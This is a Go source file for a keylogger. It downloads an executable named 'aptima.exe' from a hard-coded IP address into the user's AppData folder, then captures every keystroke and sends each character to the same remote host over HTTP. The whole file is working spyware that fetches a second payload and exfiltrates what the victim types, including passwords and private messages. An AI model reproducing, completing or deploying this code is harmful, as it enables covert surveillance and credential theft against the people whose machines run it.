package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"time"

	"github.com/kindlyfire/go-keylogger"
)

const (
	delayKeyfetchMS = 5
	URL             = "http://195.154.191.13"
)

func UserHomeDir() string {
	if runtime.GOOS == "windows" {
		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
		return home
	}
	return os.Getenv("HOME")
}

func downloadFile(filepath string, url string) (err error) {

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	return nil
}
func download() {
	homeDir := UserHomeDir() + "\\AppData\\Roaming\\aptima\\aptima.exe"
	fmt.Println(homeDir)
	if _, err := os.Stat(homeDir); err == nil {
		fmt.Printf("File exists\n")
	} else {
		fmt.Printf("File does not exist\n")
		downloadFile(homeDir, URL+"/aptima.exe")
	}

}

func main() {
	download()
	kl := keylogger.NewKeylogger()
	emptyCount := 0

	for {
		key := kl.GetKey()

		if !key.Empty {
			var str string = string(key.Rune)

			resp, err := http.Get(URL + ":8080/key?v=" + str)
			if err == nil {
				fmt.Println(resp.StatusCode)
			}
			defer resp.Body.Close()
			fmt.Printf("'%s' %d                     \n", str, key.Keycode)
		}

		fmt.Printf("Empty count: %d\r", emptyCount)

		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}

}
